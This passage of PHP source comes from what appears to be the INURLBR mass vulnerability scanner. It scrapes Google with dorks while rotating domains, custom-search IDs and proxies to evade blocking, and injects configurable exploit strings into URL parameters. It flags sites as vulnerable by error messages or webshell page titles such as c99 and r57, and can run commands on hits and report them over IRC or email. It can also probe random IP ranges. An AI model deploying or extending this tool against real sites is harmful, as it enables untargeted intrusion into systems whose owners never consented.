        $validation['INDEFINITE-05'] = 'Input string was not in a correct format';
        $validation['INDEFINITE-06'] = 'An illegal character has been found in the statement';

        #[*]SHELL SCRIPT backdoored.
        $validation['SHELL-01'] = 'c99shell</title>';
        $validation['SHELL-02'] = 'C99Shell v';
        $validation['SHELL-03'] = '<form method="POST" action="cfexec.cfm">';
        $validation['SHELL-05'] = '<input type=text name=".CMD" size=45 value=';
        $validation['SHELL-05'] = '<title>awen asp.net webshell</title>';
        $validation['SHELL-06'] = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>";
        $validation['SHELL-07'] = 'JSP Backdoor Reverse Shell';
        $validation['SHELL-08'] = 'Simple CGI backdoor by DK';
        $validation['SHELL-09'] = 'execute command: <input type="text" name="c">';
        $validation['SHELL-10'] = 'Execute Shell Command';
        $validation['SHELL-11'] = 'r57shell</title>';
        $validation['SHELL-12'] = '<title>r57Shell';
        $validation['SHELL-13'] = 'heroes1412';
        $validation['SHELL-14'] = 'MyShell';
        $validation['SHELL-15'] = 'PHP Shell';
        $validation['SHELL-16'] = 'PHPShell';
        $validation['SHELL-17'] = 'REMVIEW TOOLS';
        $validation['SHELL-18'] = '<title>iTSecTeam</title>';
        $validation['SHELL-19'] = 'JSP Backdoor Reverse Shell';
        $validation['SHELL-20'] = '<title>*  ernealizm  * </title>';
        $validation['SHELL-21'] = '<title>JSP Shell</title>';
        $validation['SHELL-22'] = '<title>KNULL Shell</title>';
        $validation['SHELL-23'] = '<title>.+- WSO.+</title>';
        $validation['SHELL-24'] = '<title>SST Sheller !</title>';
        $validation['SHELL-25'] = '<title>SyRiAn Sh3ll';
        $validation['SHELL-26'] = '<title>Mini Php Shell';
        $validation['SHELL-27'] = '<title>ASPX Shell</title>';
        $validation['SHELL-28'] = '<title>ZoRBaCK Connect</title>';
        $validation['SHELL-29'] = '<title>.+Ani-Shell.+</title>';
        $validation['SHELL-30'] = '<title>Stored Procedure Execute</title>';
        $validation['SHELL-31'] = '<title>:: www.h4ckcity.org :: Coded By 2MzRp & LocalMan ::</title>';
        $validation['SHELL-32'] = '<title>PhpShell 2.0</title>';
        $validation['SHELL-33'] = '<title>.+NTDaddy.+</title>';
        $validation['SHELL-34'] = '<title>PHP-Terminal';

        $_SESSION['config']['cms-check-resultado'] = (!is_null($_SESSION['config']['cms-check'])) ? __SimpleCheckCMS($html_) : NULL;
    }

    if (!is_null($_SESSION['config']['regexp'])) {

        preg_match_all("#\b{$_SESSION['config']['regexp']}#i", $html_, $match);
        __plus();
        return (isset($match[0][0]) && !empty($match[0][0]) ? " regular expression->{$_SESSION['config']['regexp']} - " . $match[0][0] . " FOUD! " : NULL);
    } else {

        foreach ($validation as $campo => $valor) {

            __plus();
            if (__validateBD($html_, $validation[$campo], $campo)) {

                __plus();
                return(" {$campo}  -  VALUE: {$validation[$campo]}");
            }
        }
    }
}

################################################################################
#CHECK ERROR 2 HTML INSIDE######################################################
################################################################################

function __validateBD($html_, $verificar, $bd) {

    return (strstr($html_, $verificar)) ? $bd : NULL;
}

################################################################################
#FORMAT URL#####################################################################
################################################################################

function __mountURLExploit($_url) {

    $_url = explode("=", trim(urldecode($_url)));
    $get = max(array_keys($_url));
    $get_ = $_url[$get];
    return implode("=", str_replace($get_, $get_ . ((!is_null($_SESSION['config']['exploit-get'])) ? $_SESSION['config']['exploit-get'] : NULL), $_url));
}

################################################################################
#FILTER HTML URLs ALL THE RETURN OF seekers#####################################
################################################################################

function __filterURL($html, $op = NULL) {

    $reg = !strstr($op, 'GOOGLE') ? "#\b(href=\"|src=\"|value=\")(.*?)(\")#si" :
            "#\b(href=\"|src=\"|value=\"http[s]?://|href=\"|src=\"|value=\"ftp[s]?://){1,}?([-a-zA-Z0-9\.]+)([-a-zA-Z0-9\.]){1,}([-a-zA-Z0-9_\.\#\@\:%_/\?\=\~\-\//\!\'\(\)\s\^\:blank:\:punct:\:xdigit:\:space:\$]+)#si";
    $html = str_replace('href="/url?q=', 'href="', $html);

    if (strstr($html, '.google.com/sorry/IndexRedirect?continue=https://www.google.com.') && $_SESSION['config']['persist'] <= $_SESSION["config"]['google_attempt'][1]) {

        print_r("{$_SESSION["c1"]}[ INFO ][ ERROR ]{$_SESSION["c2"]} GOOGLE LOCKED!{$_SESSION["c0"]}\n");
        $randHost = __dominioGoogleRandom();
        $_SESSION["config"]['google_attempt'][1] ++;
        __pageEngine($_SESSION["config"]["conf_array_tmp"], "GOOGLE - {$randHost}", "https://{$randHost}/search?q=[DORK]&num=1500&btnG=Search&pws=1", $_SESSION["config"]["dork_tmp"], NULL, 0, 0, 1);
    } else {
        $_SESSION["config"]["google_attempt"][1] = 0;
        preg_match_all($reg, $html, $html);
        return (array_filter(array_unique($html[0])));
    }
}

################################################################################
#FILTER HTML URLs ALL THE RETURN OF GOOGLE API##################################
################################################################################

function __filterURLJson($html) {

    $html = json_decode($html, true);
    $allresponseresults = $html['responseData']['results'];
    foreach ($allresponseresults as $value) {
        $tmp[] = $value['url'];
    }
    return (array_filter(array_unique($tmp)));
}

################################################################################
#Filtering the repeated emails #################################################
################################################################################

function __filterEmailsRepeated() {

    echo "\n\n{$_SESSION["c1"]}|[ INFO ][ Filtering the repeated emails  the file {$_SESSION['config']['arquivo_output']} ]{$_SESSION["c0"]}\n";
    $array = __openFile($_SESSION['config']['out_put_paste'] . $_SESSION['config']['arquivo_output'], 1);
    if (is_array($array)) {

        unlink($_SESSION['config']['out_put_paste'] . $_SESSION['config']['arquivo_output']);
        unset($_SESSION['config']['resultado_valores']);
        foreach ($array as $value) {

            __saveValue($_SESSION['config']['out_put_paste'] . $_SESSION['config']['arquivo_output'], $value, 2) . __plus();
            $_SESSION['config']['resultado_valores'] .= "{$value}\n";
        }
    } else {

        echo "\n\n{$_SESSION["c1"]}|[ ERROR ][ ERROR EMAILS FILTERING ]{$_SESSION["c0"]}\n";
    }
}

################################################################################
#COUNTING PROCESS END URLS / vuln AND SHOWING THE URLS / vuln###################
################################################################################

function __exitProcess() {

    $file = !is_null($_SESSION['config']['arquivo_output']) ? $_SESSION['config']['arquivo_output'] : NULL;
    $file_all = !is_null($_SESSION['config']['arquivo_output_all']) ? $_SESSION['config']['arquivo_output_all'] : NULL;
    (($_SESSION['config']['extrai-email']) ? __filterEmailsRepeated() : NULL);
    $cont = count(explode("\n", $_SESSION['config']['resultado_valores'])) - 1;
    echo "\n\n{$_SESSION["c1"]}[ INFO ] [ Shutting down ]{$_SESSION["c0"]}";
    echo "\n{$_SESSION["c1"]}[ INFO ] [ End of process INURLBR at [" . date("d-m-Y H:i:s") . "]{$_SESSION["c0"]}";
    echo "\n{$_SESSION["c1"]}[ INFO ] {$_SESSION["c0"]}{$_SESSION["c16"]}[ TOTAL FILTERED VALUES ]::{$_SESSION["c1"]} [ {$cont} ]{$_SESSION["c0"]}";
    echo!is_null($file) ? "\n{$_SESSION["c1"]}[ INFO ] {$_SESSION["c16"]}[ OUTPUT FILE ]::{$_SESSION["c1"]} [ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file}  ]{$_SESSION["c0"]}" : NULL;
    echo!is_null($file_all) ? "\n{$_SESSION["c1"]}[ INFO ] {$_SESSION["c16"]}[ OUTPUT FILE ALL ]::{$_SESSION["c1"]} [ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file_all}  ]{$_SESSION["c0"]}" : NULL;
    echo "\n{$_SESSION["c1"]}|_________________________________________________________________________________________{$_SESSION["c0"]}\n";

    print_r(!$_SESSION['config']['extrai-email'] ? $_SESSION['config']['resultado_valores'] : NULL);

    echo "\n{$_SESSION["c1"]}\_________________________________________________________________________________________/{$_SESSION["c0"]}\n";
    __getOut("\n");
}

################################################################################
#CASE URLS FILTER AND VALIDATING URL VALID######################################
################################################################################

function __subProcess($resultado = NULL) {

    $resultado_ = is_array($resultado) ? array_unique(array_filter($resultado)) : $resultado;
    if (isset($resultado_)) {

        foreach ($resultado_ as $result) {

            $result = __filterURLTAG($result);
            $result_ = __validateURL($result) ? $result : NULL;
            $blacklist_ = (!is_null($_SESSION["config"]["webcache"])) ? str_replace('webcache.,', '', $_SESSION["config"]['blacklist']) : $_SESSION["config"]['blacklist'];
            __plus();

            if (not_isnull_empty($result_) && !__validateOptions($blacklist_, $result_, 1)) {

                $_SESSION["config"]["totas_urls"].= "{$result_}\n";
            }
        }
    }
}

################################################################################
#DEBUGAR VALORES E PROCESSOS####################################################
################################################################################

function __debug($valor, $op = NULL) {

    return isset($_SESSION["config"]["debug"]) && __validateOptions($_SESSION["config"]["debug"], $op) ? "\n[ INFO ][ FUNCTION ]=>{$valor['function']}[ DEBUG ] => \n" . print_r($valor['debug']) . "\n" : NULL;
}

################################################################################
#TIME TO PROCESS SEC############################################################
################################################################################

function __timeSec($camp, $value = NULL) {

    echo!is_null($_SESSION['config'][$camp]) && !empty($_SESSION['config'][$camp]) ? "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ TIME SEC/DELAY ]::{$_SESSION["c1"]}{ {$_SESSION["c8"]}[ {$_SESSION['config'][$camp]} ]{$_SESSION["c1"]} }{$_SESSION["c0"]}{$value}" : NULL;
    !is_null($_SESSION['config'][$camp]) ? sleep($_SESSION['config'][$camp]) : NULL;
}

################################################################################
#SEARCH ENGINE CONFIGURATION####################################################
################################################################################

function __pageEngine($confArray, $motorNome, $motorURL, $dork, $postDados, $pagStart, $pagLimit, $pagIncrement, $pagStart2 = NULL, $pagIncrement2 = NULL) {

    __plus();

    echo ("\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ ENGINE ]::{$_SESSION["c1"]}[ {$motorNome} ]{$_SESSION["c0"]}\n");
    echo (!is_null($_SESSION['config']['max_pag']) ? ("{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ LIMIT PAG ]::{$_SESSION["c1"]}[ {$_SESSION['config']['max_pag']} ]{$_SESSION["c0"]}\n") : NULL);
    $http_proxy = not_isnull_empty($_SESSION['config']['proxy-http-file']) || not_isnull_empty($_SESSION['config']['proxy-http']) ? __proxyHttpRandom() : NULL;
    echo not_isnull_empty($http_proxy) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ HTTP_PROXY ]:: {$http_proxy}{$_SESSION["c0"]}\n" : NULL;
    echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ SEARCHING ]:: {$_SESSION["c0"]}\n";

    $contMaxpg = 0;
    $pagStart2_ = $pagStart2;
    $pagStart3_ = $pagStart2;
    while ($pagStart <= $pagLimit) {

        echo "{$_SESSION["c1"]}-{$_SESSION["c16"]}[{$_SESSION["c12"]}:::{$_SESSION["c16"]}]{$_SESSION["c0"]}";
        __plus();
        $_proxy = not_isnull_empty($confArray["list_proxy_rand"]) && !not_isnull_empty($_SESSION['config']['time-proxy']) ? $confArray["list_proxy_rand"] : $_SESSION["config"]["proxy"];
        $proxy = not_isnull_empty($_SESSION['config']['proxy-file']) && not_isnull_empty($_SESSION['config']['time-proxy']) ? __timeSecChangeProxy($confArray["list_proxy_file"]) : $_proxy;

        $murl[0] = str_replace("[DORK]", $dork, $motorURL);
        $murl[0] = str_replace("[PAG]", $pagStart, $murl[0]);
        $murl[0] = str_replace("[PAG2]", $pagStart2_, $murl[0]);
        $murl[0] = str_replace("[PAG3]", $pagStart3_, $murl[0]);
        $murl[0] = str_replace("[RANDOM]", base64_encode(intval(rand() % 255) . intval(rand() % 2553333)), $murl[0]);
        $murl[0] = str_replace("[IP]", intval(rand() % 255) . "." . intval(rand() % 255) . "." . intval(rand() % 255) . "." . intval(rand() % 255), $murl[0]);


        $postDados = !is_null($postDados) ? __convertUrlQuery(parse_url(urldecode($murl[0]), PHP_URL_QUERY)) : NULL;

        __debug(array('debug' => "[ URL ENGINE ]{$http_proxy}{$murl[0]}", 'function' => '__pageEngine'), 1);

        $request__ = __request_info($http_proxy . $murl[0], $proxy, $postDados);
        __plus();
        $tmp_url = ($motorNome == 'GOOGLE API') ? __filterURLJson($request__["corpo"]) : __filterURL($request__["corpo"], $motorNome);
        __subProcess($tmp_url);
        __plus();

        $pagStart = ($pagStart + $pagIncrement);
        $pagStart2_ = ($pagStart2_ + $pagIncrement);
        $pagStart3_ = ($pagStart3_ + $pagIncrement2);
        $contMaxpg++;
        __timeSec('delay');

        if (!is_null($_SESSION['config']['max_pag']) && $_SESSION['config']['max_pag'] == $contMaxpg) {

            break;
        }
    }
}

################################################################################
#SUB PROCESS INJECT VALUES######################################################
################################################################################

function __subExecExploits($target, $exploitArray = array()) {

    echo "\n{$_SESSION["c1"]}|_[ * ]__\n";
    echo "         |[ SUB PROCESS ]::\n";
    $target = __filterHostname($target);

    foreach ($exploitArray as $value) {

        $postDados = !is_null($_SESSION["config"]["sub-post"]) ? __convertUrlQuery($value) : NULL;
        $patch_GP = (is_null($postDados) ? $value : NULL);
        $url = $target . $_SESSION["config"]["sub-concat"] . $patch_GP;

        echo "{$_SESSION["c7"]}-[||]{$_SESSION["c0"]}";
        $resultado__ = __request_info($url, $_SESSION["config"]["proxy"], $postDados);
        __plus();
        $ifcode = not_isnull_empty($_SESSION['config']['ifcode']) &&
                strstr($resultado__['server']['http_code'], $_SESSION['config']['ifcode']) ?
                "CODE_HTTP_FOUND: {$_SESSION['config']['ifcode']} / " : NULL;
        $ifredirect = (strstr($resultado__['server']['redirect_url'], $_SESSION['config']['ifredirect'])) ? $resultado__['server']['redirect_url'] : NULL;
        $_ex['erroReturn'] = $ifredirect . $ifcode . __checkError($resultado__['corpo']);

        __plus();
        $_ex['vull_style'] = (not_isnull_empty($_ex['erroReturn'])) ?
                "{$_SESSION["c15"]}[ INFO ][ {$_ex['erroReturn']} ]\n[ INFO ][ TARGET POTENTIALLY VULNERABLE ]: " . __cli_beep() : NULL;
        echo (not_isnull_empty($_ex['erroReturn']) ? "\n{$_ex['vull_style']}{$url}\n{$_SESSION["c0"]}" : NULL);
        echo (not_isnull_empty($_ex['erroReturn']) ? __saveValue($_SESSION['config']['arquivo_output'], $url, 1) . "\n" : NULL);
        __plus();
        $_SESSION['config']['resultado_valores'].=(not_isnull_empty($_ex['erroReturn']) ? "{$url}\n" : NULL);
        (not_isnull_empty($_ex['erroReturn']) && not_isnull_empty($_SESSION['config']['irc']['irc_connection']) ?
                        __ircMsg($_SESSION['config']['irc'], "{$_ex['erroReturn']}::: {$url}") : NULL);

        (not_isnull_empty($_ex['erroReturn']) && !is_null($_SESSION['config']['sub-cmd-vul']) ? __command($_SESSION['config']['sub-cmd-vul'], $url) : NULL);
        (not_isnull_empty($_SESSION['config']['sub-cmd-all']) ? __command($_SESSION['config']['sub-cmd-all'], $url) : NULL);
        __plus();
        __timeSec('delay');
    }
    unset($_ex);
}

################################################################################
#SEND VALUES EMAIL##############################################################
################################################################################
# (PHP 4, PHP 5) mail — Send mailhttp://php.net/manual/en/function.mail.php

function __sendMail($email, $value) {

    $headers = NULL;
    $headers .= "From: <scanner-inurlbr@localhost>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
    $headers .= "content-type: text/html\nX-priority: 1\n";
    $body = "------------------------------------------------------\n";
    $body.="DATE:  [" . date("d-m-Y H:i:s") . "]";
    $body.=not_isnull_empty($_SESSION['config']['http-header']) ? "HTTP HEADER: {$_SESSION['config']['http-header']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['motor']) ? "MOTOR BUSCA: {$_SESSION['config']['motor']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['tipoerro']) ? "TIPO ERROR: {$_SESSION['config']['tipoerro']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['exploit-get']) ? "EXPLOIT GET: {$_SESSION['config']['exploit-get']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['exploit-post']) ? "EXPLOIT-POST: {$_SESSION['config']['exploit-post']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['command-vul']) ? "COMMAND VUL: {$_SESSION['config']['command-vul']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['command-all']) ? "COMMAND ALL: {$_SESSION['config']['command-all']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['user-agent']) ? "USER AGENT: {$_SESSION['config']['user-agent']}\n" : NULL;
    $body.= "------------------------------------------------------\n";

    if (mail($email, "[ INFO ][ OUTPUT INURLBR ]:: {$value}", $body, $headers)) {
        __plus();
        return "[ INFO ][ SUBMITTED SUCCESSFULLY ]\n";
    } else {
        __plus();
        return "[ INFO ][ NOT SENT ]\n";
    }
}

################################################################################
#HOST GOOGLE RANDOM#############################################################
################################################################################

function __dominioGoogleRandom() {

    $_SESSION["random"]['dominio_google'] = array(
        'www.google.com', 'www.google.ac', 'www.google.com.om',
        'www.google.ad', 'www.google.ae', 'www.google.com.af',
        'www.google.com.ag', 'www.google.com.ai', 'www.google.am',
        'www.google.it.ao', 'www.google.com.ar', 'www.google.cat',
        'www.google.as', 'www.google.at', 'www.google.com.au',
        'www.google.az', 'www.google.ba', 'www.google.com.bd',
        'www.google.be', 'www.google.bf', 'www.google.bg',
        'www.google.com.bh', 'www.google.bi', 'www.google.bj',
        'www.google.com.bn', 'www.google.com.bo', 'www.google.com.br',
        'www.google.bs', 'www.google.co.bw', 'www.google.com.by',
        'www.google.com.bz', 'www.google.ca', 'www.google.com.kh',
        'www.google.cc', 'www.google.cd', 'www.google.cf',
        'www.google.cn', 'www.google.com.co', 'www.google.co.nz',
        'www.google.cg', 'www.google.ch', 'www.google.ci',
        'www.google.co.ck', 'www.google.cl', 'www.google.cm',
        'www.google.co.cr', 'www.google.com.cu', 'www.google.cv',
        'www.google.cz', 'www.google.de', 'www.google.nu',
        'www.google.dj', 'www.google.dk', 'www.google.dm',
        'www.google.com.do', 'www.google.dz', 'www.google.no',
        'www.google.com.ec', 'www.google.ee', 'www.google.com.eg',
        'www.google.es', 'www.google.com.et', 'www.google.com.np',
        'www.google.fi', 'www.google.com.fj', 'www.google.fm',
        'www.google.fr', 'www.google.ga', 'www.google.nl',
        'www.google.ge', 'www.google.gf', 'www.google.gg',
        'www.google.com.gh', 'www.google.com.gi', 'www.google.nr',
        'www.google.gl', 'www.google.gm', 'www.google.gp',
        'www.google.gr', 'www.google.com.gt', 'www.google.com.ni',
        'www.google.gy', 'www.google.com.hk', 'www.google.hn',
        'www.google.hr', 'www.google.ht', 'www.google.com.ng',
        'www.google.hu', 'www.google.co.id', 'www.google.iq',
        'www.google.ie', 'www.google.co.il', 'www.google.com.nf',
        'www.google.im', 'www.google.co.in', 'www.google.io',
        'www.google.is', 'www.google.it', 'www.google.ne',
        'www.google.je', 'www.google.com.jm', 'www.google.jo',
        'www.google.co.jp', 'www.google.co.ke', 'www.google.com.na',
        'www.google.ki', 'www.google.kg', 'www.google.co.kr',
        'www.google.com.kw', 'www.google.kz', 'www.google.co.mz',
        'www.google.la', 'www.google.com.lb', 'www.google.com.lc',
        'www.google.li', 'www.google.lk', 'www.google.com.my',
        'www.google.co.ls', 'www.google.lt', 'www.google.lu',
        'www.google.lv', 'www.google.com.ly', 'www.google.com.mx',
        'www.google.co.ma', 'www.google.md', 'www.google.me',
        'www.google.mg', 'www.google.mk', 'www.google.mw',
        'www.google.ml', 'www.google.mn', 'www.google.ms',
        'www.google.com.mt', 'www.google.mu', 'www.google.mv',
        'www.google.com.pa', 'www.google.com.pe', 'www.google.com.ph',
        'www.google.com.pk', 'www.google.pn', 'www.google.com.pr',
        'www.google.ps', 'www.google.pt', 'www.google.com.py',
        'www.google.com.qa', 'www.google.ro', 'www.google.rs',
        'www.google.ru', 'www.google.rw', 'www.google.com.sa',
        'www.google.com.sb', 'www.google.sc', 'www.google.se',
        'www.google.com.sg', 'www.google.sh', 'www.google.si',
        'www.google.sk', 'www.google.com.sl', 'www.google.sn',
        'www.google.sm', 'www.google.so', 'www.google.st',
        'www.google.com.sv', 'www.google.td', 'www.google.tg',
        'www.google.co.th', 'www.google.tk', 'www.google.tl',
        'www.google.tm', 'www.google.to', 'www.google.com.tn',
        'www.google.com.tr', 'www.google.tt', 'www.google.com.tw',
        'www.google.co.tz', 'www.google.com.ua', 'www.google.co.ug',
        'www.google.co.uk', 'www.google.us', 'www.google.com.uy',
        'www.google.co.uz', 'www.google.com.vc', 'www.google.co.ve',
        'www.google.vg', 'www.google.co.vi', 'www.google.com.vn',
        'www.google.vu', 'www.google.ws', 'www.google.co.za',
        'www.google.co.zm', 'www.google.co.zw'
    );

    return $_SESSION["random"]['dominio_google'][rand(0, count($_SESSION["random"]['dominio_google']) - 1)];
}

################################################################################
#(CSE)-GOOGLE Custom Search Engine ID RANDOM####################################
################################################################################

function __googleGenericRandom() {

    $generic = array(
        '013269018370076798483:wdba3dlnxqm',
        '005911257635119896548:iiolgmwf2se',
        '007843865286850066037:b0heuatvay8',
        '002901626849897788481:cpnctza84gq',
        '006748068166572874491:55ez0c3j3ey',
        '012984904789461885316:oy3-mu17hxk',
        '006688160405527839966:yhpefuwybre',
        '003917828085772992913:gmoeray5sa8',
        '007843865286850066037:3ajwn2jlweq',
        '010479943387663786936:wjwf2xkhfmq',
        '012873187529719969291:yexdhbzntue',
        '012347377894689429761:wgkj5jn9ee4'
    );
    return $generic[rand(0, count($generic) - 1)];
}

################################################################################
#PROXY HTTP BASE FILE###########################################################
################################################################################

function __proxyHttpRandom() {

    $proxy_file = (file_exists($_SESSION['config']['proxy-http-file']) ? __openFile($_SESSION['config']['proxy-http-file'], 1) : array());
    $proxy_ = is_array($proxy_file) ? array_merge($_SESSION['config']['proxy-http'], $proxy_file) : $_SESSION['config']['proxy-http'];

    return $proxy_[rand(0, count($proxy_) - 1)];
}

################################################################################
#FILTER UNIQUE DOMAIN###########################################################
################################################################################

function __filterDomainUnique($resultados) {

    if (is_array($resultados)) {

        foreach ($resultados as $value) {

            $temp[] = "http://" . __filterHostname($value);
        }

        return array_unique(array_filter($temp));
    }

    return FALSE;
}

################################################################################
#FILTER IF URL DOMAIN###########################################################
################################################################################

function __filterURLif($resultados) {

    if (is_array($resultados)) {

        foreach ($resultados as $value) {

            $temp[] = not_isnull_empty($_SESSION['config']['ifurl']) && strstr($value, $_SESSION['config']['ifurl']) ? $value : NULL;
        }

        return array_unique(array_filter($temp));
    }

    return FALSE;
}

################################################################################
#GENERATOR RANGE IP#############################################################
################################################################################

function __generatorRangeIP($range) {

    $ip_ = explode(',', $range);
    if (is_array($ip_)) {

        $_ = array(0 => ip2long($ip_[0]), 1 => ip2long($ip_[1]));
        while ($_[0] <= $_[1]) {

            $ips[] = "http://" . long2ip($_[0]);
            $_[0] ++;
        }
    } else {

        return FALSE;
    }

    return $ips;
}

################################################################################
#GENERATOR RANGE IP RANDOM######################################################
################################################################################

function __generatorIPRandom($cont) {

    $cont[0] = 0;
    while ($cont[0] < $cont[1]) {

        $bloc[0] = rand(0, 255);
        $bloc[1] = rand(0, 255);
        $bloc[2] = rand(0, 255);
        $bloc[3] = rand(0, 255);
        $ip[] = "http://{$bloc[0]}.{$bloc[1]}.{$bloc[2]}.{$bloc[3]}";
        $cont[0] ++;
    }
    return array_unique($ip);
}

################################################################################
#ACESSING FILE ROBOTS###########################################################
################################################################################

function __getValuesRobots($url) {

    $_[0] = "http://" . __filterHostname($url) . "/robots.txt";
    $_[0] = __request_info($_[0], $_SESSION["config"]["proxy"], NULL);
    echo "\n{$_SESSION["c1"]}|_[ * ]__\n";
    echo "         |[ ACCESSING FILE ROBOTS ]::\n";

    if (not_isnull_empty($_[0]['corpo']) && $_[0]['server']['http_code'] == 200) {

        $_[1] = array_unique(array_filter(explode("\n", $_[0]['corpo'])));

        foreach ($_[1] as $value) {

            if (strstr($value, 'Disallow:') || strstr($value, 'Allow:')) {

                echo "|_[ + ]__|[ value={$value}\n";
                __saveValue($_SESSION['config']['arquivo_output'], $value, 2);
            }
            __plus();
        }
    } else {

        echo "\t[x][ ERRO ] LOAD FILE ROBOTS.TXT [ COD_HTTP ]:: {$_[0]['server']['http_code']}\n{$_SESSION["c0"]}";
    }
}

################################################################################
#Base64 string encryption md5 , hexadecimal, hex, base64 & random string########
################################################################################

function __crypt($url) {

    preg_match_all("#(md5|base64|hex|random)(\()(.*?)(\))#", $url, $_);
    $cont = 0;

    foreach ($_[0] as $replace) {

        if (strstr($replace, 'md5('))
            $func = 'md5';

        if (strstr($replace, 'base64('))
            $func = 'base64_encode';

        if (strstr($replace, 'hex('))
            $func = 'bin2hex';

        if (strstr($replace, 'random('))
            $func = 'random';

        $url = str_replace($replace, $func($_[3][$cont]), $url);
        $cont ++;
    }
    return $url;
}

################################################################################
#GENERATE RANDOM STRING#########################################################
################################################################################
#(PHP4,PHP5) Shuffle an array http://php.net/manual/en/function.shuffle.php

function random($__) {
    $_ = 'A,a,B,b,C,c,D,d,E,e,F,f,G,g,';
    $_.= 'H,h,I,i,J,j,K,k,L,l,M,m,';
    $_.= '1,2,3,4,5,6,7,8,9,0';
    $_ = explode(',', $_);
    shuffle($_);
    $_ = implode($_, '');
    return substr($_, 0, $__);
}

################################################################################
#GENERATE RANDOM DORKS##########################################################
################################################################################

function __randomDork($_) {

    $dk[1] = array('view', 'page', 'index', 'file', 'ver', 'web', 'form', 'public', 'map', 'visit',
        'site', 'perfil', 'sistema', 'system', 'cad', 'frm', 'content', 'conteudo', 'graf', 'page',
        'search', 'arch', 'class', 'app', 'galeria', 'text', 'noticia', 'default', 'storytopic', 'home',
        'lenoticia', 'counter', 'todos', 'all', 'principal', 'main', 'pesquisa', 'dir', 'category', 'news_more',
        'info', 'display', 'showrecord', 'download', 'sum', 'produtos', 'Menu', 'guia', 'product', 'about',
        'WebForms', 'proj', 'inter', 'PageText', 'topper', 'notes', 'name', 'redirect', 'open_link', 'artist',
        'curricu', 'resumen', 'top', 'list', 'directorio', 'Project', 'membre', 'photos', 'Contenido',
        'presentation', 'component', 'release', 'article', 'asesores', 'Detail', 'about', 'lire', 'story',
        'memoriam', 'transport', 'journal', 'album', 'community', 'includes', 'ler', 'video', 'configs', 'refer',
        'form_cpf', 'atualiza', 'refresh', 'materia', 'fotos', 'photos', 'itemdetail', 'listcategoriesandproduct',
        'myaccount', 'learnmore', 'powersearch', 'prodbycat', 'prodetails', 'prodlist', 'productDisplay', 'promotion',
        'pview', 'resellers', 'inc', 'oferta', 'layout', 'standard', 'blank', 'path', 'declaration', 'newsitem', 'games',
        'buy', 'readnews', 'event', 'news_view', 'communique_detail', 'kategorie', 'preview', 'faq2', 'comment', 'newsDetail',
        'shopping', 'shop_category', 'product_ranges_view', 'section', 'ages', 'curriculum', 'galeri_info', 'tekst', 'play_old',
        'viewapp', 'padrao', 'sitio', 'head', 'template', 'index1', 'index2', 'index3', 'index4', 'index5', 'mod', 'press', 'gery',
        'index_table', 'mainfile', '_functions', 'phpshop', 'new-visitor.inc', 'Packages', 'editor', 'board', 'advanced', 'pref',
        'q', 'side', 'home1', 'home2', 'home3', 'getbook', 'checkout', 'affiliate', 'addcart', 'product_info', 'showsub', 'library',
        'edition', 'get', 'temp', 'catalog', 'press2', 'company', 'jobs', 'review', 'input', 'cats', 'showmedia', 'event_info'
    );


    $dk[2] = array('view', 'file', 'ver', 'web', 'form', 'public', 'map', 'site', 'perfil', 'bookid',
        'sistema', 'system', 'cad', 'frm', 'content', 'id', 'action', 'user', 'option', 'area', 'catalogid',
        'tp', 'pg', 'p', 'v', 'a', 't', 'r', 'o', 'm', 'n', 'sec', 'lang', 'search', 'Itemid', 'open',
        'servicoid', 'id_ap', 'artic', 'pag', 'archive', 'ind', 'sigl', 'url', 'link', 'tp', 'cd', 'item_ID',
        'web', 'sourc', 'sitemap', 'go', 'galeria', 'img', 'notic', 'num', 'ter', 'dow', 'type', 'CartId',
        'redir', 'default', 'storytopic', 'topic', 'cod_noti', 'detalhe', 'ler', 'storyid', 'start',
        'click', 'title', 'tmpl', 'templat', 'cont', 'corp', 'contat', 'consult', 'main', 'exib', 'guia',
        'span', 'OpenDocument', 'document', 'codidem', 'pesq', 'print', 'imprimir', 'jobs', 'pic', 'contri',
        'code', 'myPage', 'openPage', 'homepage', 'home', 'inner', 'custom', 'bin', 'IsisScript', 'pid',
        'wxis.exe', 'wood', 'modules', 'kbn', 'chid', 'jump', 'mes', 'ano', 'month', 'year', 'day', 'dia', 'pre',
        'show', 'download', 'summit', 'new', 'coming', 'Category', 'produtos', 'Menu', 'uid', 'Consulta', 'qry',
        'product', 'WebForms', 'proj', 'inter', 'scgi', 'orig_q', 'b1', 'showpage', 'filter', 'Detail', 'about',
        'itemlist', 'memor', 'info', 'website', 'cidade', 'lic', 'materia', 'SEC_', 'includes', 'store', 'ler',
        'reader', 'src', 'theme', 'Boletim', 'busca', 'date', 'video', 'configs', 'exec', 'doc', 'refresh', 'telec',
        'digital', 'materia', 'portal', 'shop', 'photos', 'sales', 'open', 'check', 'token', 'general', 'process', 'ViewType',
        'idCategor', 'intCatalogID', 'Cart', 'maingroup', 'play', 'where', 'mod', 'panel', 'str', 'staff_id', 'buy', 'preview',
        'chapter', 'club_id', 'GLOBALS', 'absolute_path', 'body', 'from', 'pg_ID', 'load', 'systempath', 'conf', 'do', 'x', 'temp',
        'see', 'act', 'middle', 'content', 'q', 'my', 'to', 'nivel', 'arq', 'modo', 'rss', 'pagina', 'opcion', 'loader', 'l', 'this',
        'subject', 'param', 'index', 'tipo', 'second', 'loc', 'cat_id', 'magazin', 'artist_art', 'cID', 'cat', 'message_id', ''
    );

